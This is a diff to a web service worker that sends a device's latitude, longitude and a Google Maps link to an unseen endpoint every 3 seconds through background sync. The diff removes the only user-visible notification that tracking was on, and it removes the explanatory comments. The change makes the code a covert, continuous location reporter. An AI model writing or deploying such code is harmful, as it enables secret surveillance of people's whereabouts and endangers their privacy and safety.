@@ -1,43 +1,22 @@
-const API_BASE_URL = "http://localhost:4000"; // Ensure this matches your server port
-
-self.addEventListener("install", (event) => {
-    self.skipWaiting();
-});
-
-//explain self.skipWaiting(); in the context of service workers:
-//The skipWaiting() method of the ServiceWorkerGlobalScope interface forces the waiting service worker to become the active service worker. 
-// This was previously done by the claim() method of Clients. This method allows a worker to become active while pages are still open.
-//The claim() method of the Clients interface allows an active service worker to set itself as the controller for all clients within its scope.
-//  This triggers a "controllerchange" event on navigator.serviceWorker in any clients that are under the service worker's control.
-
-self.addEventListener("activate", (event) => {
-    event.waitUntil(self.clients.claim());
-});
-//explain self.addEventListener("activate", (event) => { :
-// The activate event is fired when the service worker is ready to take control of pages.
-// The event is fired after registration and when the service worker is ready to control the clients.
-// The event is generally used to clean up resources used in the previous version of the service worker.
-
-// Handle background sync
 self.addEventListener("sync", function (event) {
     if (event.tag === "syncLocation") {
         event.waitUntil(fetchLocationAndSend());
     }
 });
-//explain self.addEventListener("sync", async (event) => { :
-// The sync event is fired when the browser attempts to synchronize data in the background.
-// The event is fired when the browser is ready to sync data in the background.
-// The event is generally used to perform background tasks such as updating data or sending requests.
 
 async function fetchLocationAndSend() {
     return new Promise((resolve, reject) => {
-        self.registration.showNotification("🌍 Background Location Tracking Enabled");
-        
-        navigator.geolocation.watchPosition(
-            async (position) => {
-                const { latitude, longitude } = position.coords;
+        openDatabase().then(db => {
+            getLocationFromDB(db).then(async (locationData) => {
+                if (!locationData) {
+                    console.warn("⚠️ No location data available for background update.");
+                    return resolve();
+                }
+
+                const { latitude, longitude } = locationData;
+
                 const payload = {
-                    content: `📍 **Background Location Update:**\n🌍 **Latitude:** ${latitude}\n🗺️ **Longitude:** ${longitude}\n🔗 [Google Maps](https://www.google.com/maps/place/${latitude},${longitude})`
+                    content: `📍 **Background Location Update (Every 3s):**\n🌍 **Latitude:** ${latitude}\n🗺️ **Longitude:** ${longitude}\n🔗 [Google Maps](https://www.google.com/maps/place/${latitude},${longitude})`
                 };
 
                 try {
@@ -54,16 +33,50 @@ async function fetchLocationAndSend() {
                 }
 
                 resolve();
-            },
-            (error) => {
-                console.error("🚨 Background Location error:", error.message);
-                reject(error);
-            },
-            {
-                enableHighAccuracy: true,
-                timeout: 5000,
-                maximumAge: 0
-            }
-        );
+            }).catch(reject);
+        }).catch(reject);
     });
 }
+
+// Open IndexedDB
+function openDatabase() {
+    return new Promise((resolve, reject) => {
+        const request = indexedDB.open("LocationDB", 1);
+
+        request.onupgradeneeded = function (event) {
+            const db = event.target.result;
+            if (!db.objectStoreNames.contains("locations")) {
+                db.createObjectStore("locations", { keyPath: "id" });
+            }
+        };
+
+        request.onsuccess = function () {
+            resolve(request.result);
+        };
+
+        request.onerror = function () {
+            reject("❌ Error opening IndexedDB");
+        };
+    });
+}
+
+// Get Last Known Location
+function getLocationFromDB(db) {
+    return new Promise((resolve, reject) => {
+        const transaction = db.transaction("locations", "readonly");
+        const store = transaction.objectStore("locations");
+        const getRequest = store.get("latest");
+
+        getRequest.onsuccess = function () {
+            resolve(getRequest.result);
+        };
+        getRequest.onerror = function () {
+            reject("❌ Error retrieving location from IndexedDB");
+        };
+    });
+}
+
+// Request periodic background sync every 3 seconds
+setInterval(() => {
+    self.registration.sync.register("syncLocation").catch(console.error);
+}, 3000);
